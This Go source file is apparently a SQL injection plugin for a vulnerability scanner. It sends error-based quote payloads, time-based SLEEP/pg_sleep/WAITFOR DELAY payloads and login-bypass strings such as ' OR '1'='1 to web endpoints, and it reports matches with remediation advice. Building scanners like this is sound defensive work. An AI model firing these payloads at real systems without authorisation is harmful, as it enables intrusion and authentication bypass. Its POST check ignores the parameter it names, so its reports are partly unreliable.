package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"math"
	"net/url"
	"strings"
	"time"
)

// ==================================================
// ==================================================
// ==================================================
// 11. SQLi - v4.2 (SMART GUESSING + TIME + POST)
// ==================================================
type SQLInjectionPlugin struct{}

func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Smart Hybrid)" }

func (p *SQLInjectionPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{
		"/",
		"/index.php", "/login.php", "/product.php", "/cart.php", "/news.php", "/search.php",
		"/Default.aspx", "/Login.aspx", "/Products.aspx", "/Details.aspx", "/Comments.aspx",
		"/login", "/signin", "/search", "/view",
	}

	params := []string{"id", "cat", "item", "u", "user", "q", "search", "query", "p", "pid", "article_id", "news_id"}

	errorPayloads := []string{"'", "\"", "`", "' OR '1'='1"}

	dbErrors := []string{
		"SQL syntax", "mysql_fetch", "ORA-01756", "Oracle Error",
		"PostgreSQL query failed", "SQLServer JDBC Driver",
		"Microsoft OLE DB Provider", "Unclosed quotation mark",
		"CLI Driver", "DB2 SQL error", "SQLite/JDBCDriver",
		"System.Data.SqlClient.SqlException",
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range errorPayloads {

				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))

				resp, err := client.Get(targetURL)
				if err != nil {
					continue
				}

				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				bodyStr := string(bodyBytes)

				for _, errMsg := range dbErrors {
					if strings.Contains(bodyStr, errMsg) {
						return &models.Vulnerability{
							Target:      target,
							Name:        "SQL Injection (Error-Based)",
							Severity:    "CRITICAL",
							CVSS:        9.8,
							Description: fmt.Sprintf("Database error triggered via smart parameter guessing.\nURL: %s\nPayload: %s\nMatch: %s", targetURL, payload, errMsg),
							Solution:    "Use Prepared Statements (Parameterized Queries).",
							Reference:   "OWASP A03:Injection",
						}
					}
				}
			}
		}
	}

	sleepSeconds := 5
	timePayloads := map[string]string{
		"MySQL/MariaDB": fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
		"PostgreSQL":    fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepSeconds),
		"MSSQL":         fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
	}

	for dbType, payload := range timePayloads {

		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
		start := time.Now()
		resp, err := client.Get(targetURL)
		duration := time.Since(start)

		if err == nil {
			resp.Body.Close()
		}

		if duration.Seconds() >= float64(sleepSeconds) {
			return &models.Vulnerability{
				Target:      target,
				Name:        fmt.Sprintf("Blind SQL Injection (%s)", dbType),
				Severity:    "CRITICAL",
				CVSS:        9.9,
				Description: fmt.Sprintf("Server delayed response by %.2f seconds.\nTime-Based Payload: %s", duration.Seconds(), payload),
				Solution:    "Validate inputs and use Prepared Statements.",
				Reference:   "OWASP Blind SQL Injection",
			}
		}
	}

	loginPages := []string{
		"/login.php", "/admin", "/admin.php", "/user/login", "/index.php", "/login.aspx",
	}

	postPayloads := []string{
		"' OR '1'='1", "' OR 1=1 --", "admin' --", "admin' #", "\" OR \"1\"=\"1",
	}

	formParams := []string{"username", "user", "email", "login", "id", "txtUser", "txtPassword"}

	for _, page := range loginPages {
		targetEndpoint := baseURL + page

		baseLen, err := getPostResponseLength(client, targetEndpoint, "invalid_user_x9", "invalid_pass_x9")
		if err != nil {
			continue
		}

		for _, payload := range postPayloads {
			for _, param := range formParams {
				attackLen, err := getPostResponseLength(client, targetEndpoint, payload, "123456")
				if err != nil {
					continue
				}

				diff := math.Abs(float64(attackLen - baseLen))
				isSignificant := diff > 5 || (baseLen == 0 && attackLen > 500)

				if isSignificant {
					return &models.Vulnerability{
						Target:      target,
						Name:        "SQL Injection (POST/Auth Bypass)",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("Login bypass detected via POST injection on %s!\nParameter: %s\nPayload: %s\nDifference: %.0f bytes", page, param, payload, diff),
						Solution:    "Sanitize all POST inputs and use Prepared Statements (PDO).",
						Reference:   "OWASP Injection / Authentication Bypass",
					}
				}
			}
		}
	}

	return nil
}
